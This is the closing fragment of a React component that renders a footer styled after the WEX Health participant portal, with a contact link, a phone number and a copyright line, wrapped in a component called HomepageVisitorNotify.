                    <a href="#" className="font-bold text-[#005F9E] hover:underline">Contact Us</a> - Call Participant Services at (866) 451-3399
                  </p>
                  <p className="text-[11px] text-[#555555] mt-1">
                    © WEX Health Inc. 2004-2026. All rights reserved. Powered by WEX Health
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
    </HomepageVisitorNotify>
  )
}
